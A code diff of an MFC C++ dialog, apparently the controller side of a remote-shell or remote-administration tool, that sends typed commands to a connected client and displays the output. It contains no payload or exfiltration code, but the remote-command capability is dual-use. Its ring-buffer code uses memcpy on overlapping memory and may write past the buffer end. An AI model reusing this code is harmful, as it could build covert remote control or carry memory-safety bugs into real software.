@@ -19,6 +19,12 @@ CShellRemote::CShellRemote(CWnd* pParent /*=nullptr*/, CClient* pClient /*= null
 
 	this->Create(IDD_DIALOG2, GetDesktopWindow());
 	this->ShowWindow(SW_SHOW);
+	
+	WCHAR pszTitle[64];
+	StringCbPrintf(pszTitle, 64, L"远程SHELL    %s:%d\n", pClient->m_lpszIpAddress, pClient->m_wPort);
+	this->SetWindowText(pszTitle);
+
+	m_dwBufferTail = 0;
 }
 
 CShellRemote::~CShellRemote()
@@ -36,6 +42,7 @@ void CShellRemote::DoDataExchange(CDataExchange* pDX)
 BEGIN_MESSAGE_MAP(CShellRemote, CDialogEx)
 	ON_EN_CHANGE(IDC_EDIT1, &CShellRemote::OnEnChangeEdit1)
 	ON_BN_CLICKED(IDC_BUTTON1, &CShellRemote::OnBnClickedButton1)
+	ON_WM_CLOSE()								// 不写这个不会触发自己重写的OnClose()
 END_MESSAGE_MAP()
 
 
@@ -72,9 +79,9 @@ void CShellRemote::OnBnClickedButton1()
 	m_EditCommand.GetWindowText(pbCommand, 256);
 	//MessageBox(pbCommand);
 	DWORD dwCommandLength = (wcslen(pbCommand) + 1) * 2;
-	theApp.m_Server.SendPacket(m_pClient, SHELL_EXECUTE, (PBYTE)pbCommand, dwCommandLength);
+	theApp.m_Server.SendPacket(m_pSocketClient, SHELL_EXECUTE, (PBYTE)pbCommand, dwCommandLength);
 
-	printf("IsConnected = %d\n", theApp.m_Server.m_pServer->IsConnected(m_pClient->m_dwConnectId));
+	printf("IsConnected = %d\n", theApp.m_Server.m_pServer->IsConnected(m_pSocketClient->m_dwConnectId));
 }
 
 
@@ -87,27 +94,65 @@ void CShellRemote::OnRecvChildSocketClientPacket(CPacket* pPacket) {
 	
 	switch (pPacket->m_PacketHead.wCommandId) {
 
-	case SHELL_EXECUTE: {
-		//MessageBox((WCHAR*)pPacket->m_pbPacketBody);
+		case SHELL_EXECUTE: {
 
 
-		//CString strText = _T("");
-		////获得当前文本
-		//m_EditResult.GetWindowText(strText);
-		//strText += _T("ABC1");
-		////设置追加后的文本
 
-		WCHAR pszCmdResult[8096];
-		MultiByteToWideChar(CP_ACP, 0, (CHAR*)pPacket->m_pbPacketBody, -1, pszCmdResult, 8096);
+			DWORD dwWideCharLength = MultiByteToWideChar(CP_ACP, 0, (CHAR*)pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength, NULL, 0);
+			WCHAR* pszWideCharTemp = new WCHAR[dwWideCharLength];
+			MultiByteToWideChar(CP_ACP, 0, (CHAR*)pPacket->m_pbPacketBody, pPacket->m_dwPacketBodyLength, pszWideCharTemp, dwWideCharLength);
+			
+			if (dwWideCharLength > COMMAND_RESULT_BUFFER_LENGTH) {
+				memcpy(m_pszWideChar, pszWideCharTemp + (dwWideCharLength - COMMAND_RESULT_BUFFER_LENGTH), COMMAND_RESULT_BUFFER_LENGTH*2);
+				m_dwBufferTail = COMMAND_RESULT_BUFFER_LENGTH;
+			}
+			else if (m_dwBufferTail + dwWideCharLength <= COMMAND_RESULT_BUFFER_LENGTH){
+				memcpy(m_pszWideChar + m_dwBufferTail, pszWideCharTemp, dwWideCharLength*2);
+				m_dwBufferTail += dwWideCharLength;
+			}
+			else {
+				memcpy(m_pszWideChar, m_pszWideChar + (m_dwBufferTail + dwWideCharLength - COMMAND_RESULT_BUFFER_LENGTH), (COMMAND_RESULT_BUFFER_LENGTH - dwWideCharLength)*2);
+				memcpy(m_pszWideChar + (COMMAND_RESULT_BUFFER_LENGTH - dwWideCharLength), pszWideCharTemp, dwWideCharLength*2);
+				m_dwBufferTail = COMMAND_RESULT_BUFFER_LENGTH;
+			}
+			m_pszWideChar[m_dwBufferTail] = 0;		// 字符串以0结尾
 
-		USES_CONVERSION;			// 注意CMD用的是多字符集，不是unicode.
-		m_EditResult.SetWindowText(pszCmdResult);
-		break;
+			delete[] pszWideCharTemp;
+			pszWideCharTemp = nullptr;
+
+			m_EditResult.SetWindowText(m_pszWideChar);
+			m_EditResult.PostMessage(WM_VSCROLL, SB_BOTTOM, 0);
+			break;
+		}
+		case SHELL_CLOSE:
+			SendMessage(WM_CLOSE);
+			break;
 	}
-		
+}
 
-	case SHELL_CLOSE:
 
-		break;
+void CShellRemote::OnOK()
+{
+	//什么也不写
+}
+
+//然后重载PreTranslateMessage函数  
+//把ESC键的消息，用RETURN键的消息替换，这样，按ESC的时候，也会执行刚才的OnOK函数  
+BOOL CShellRemote::PreTranslateMessage(MSG* pMsg)
+{
+	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_ESCAPE)
+	{
+		pMsg->wParam = VK_RETURN;   //将ESC键的消息替换为回车键的消息，这样，按ESC的时候  
+									//也会去调用OnOK函数，而OnOK什么也不做，这样ESC也被屏蔽  
 	}
+	return   CDialog::PreTranslateMessage(pMsg);
+}
+
+
+void CShellRemote::OnClose() {
+
+	DWORD dwConnectId = m_pSocketClient->m_dwConnectId;
+	theApp.m_Server.m_pServer->Disconnect(dwConnectId);		// 断开这条子socket
+
+	CDialogEx::OnClose();
 }
